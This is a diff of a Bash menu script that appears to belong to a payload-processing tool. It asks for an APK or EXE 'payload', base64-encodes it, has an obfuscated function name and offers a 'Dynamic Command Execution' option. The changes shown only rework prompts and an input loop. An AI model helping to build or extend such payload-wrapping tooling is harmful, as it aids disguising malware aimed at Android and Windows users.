@@ -30,6 +30,7 @@ encrypt_payload() {
         echo -e "\e[1;31mFile not found: $1\e[0m"
         return 1
     fi
+
     encoded=$(base64 "$1")
     if [[ $? -ne 0 ]]; then
         echo -e "\e[1;31mError encoding file.\e[0m"
@@ -56,11 +57,13 @@ d3cRyP73() {
 }
 get_payload() {
     local payload_path=""
-    while [[ ! -f "$payload_path" ]]; do
-        echo -e "\e[1;34mEnter the path to your payload (APK or EXE):\e[0m"
+    while true; do
+        echo -e "\e[1;34mEnter the full path to your payload (APK or EXE):\e[0m"
         read -r payload_path
-        if [[ ! -f "$payload_path" ]]; then
-            echo -e "\e[1;31mFile not found! Try again.\e[0m"
+        if [[ -f "$payload_path" ]]; then
+            break
+        else
+            echo -e "\e[1;31mFile not found at '$payload_path'. Please try again.\e[0m"
         fi
     done
     encrypt_payload "$payload_path"
@@ -115,7 +118,7 @@ choose_platform() {
 main_menu() {
     clear_screen
     echo -e "\e[1;36mWelcome! Choose an option:\e[0m"
-    echo -e "\e[1;32m1.\e[0m \e[1;33mChoose Platform (Android/Windows payload processing)\e[0m"
+    echo -e "\e[1;32m1.\e[0m \e[1;33mChoose Platform (Android/Windows)\e[0m"
     echo -e "\e[1;32m2.\e[0m \e[1;33mDynamic Command Execution\e[0m"
     echo -e "\e[1;32m3.\e[0m \e[1;33mExit\e[0m"
     read -p "Choice: " main_choice
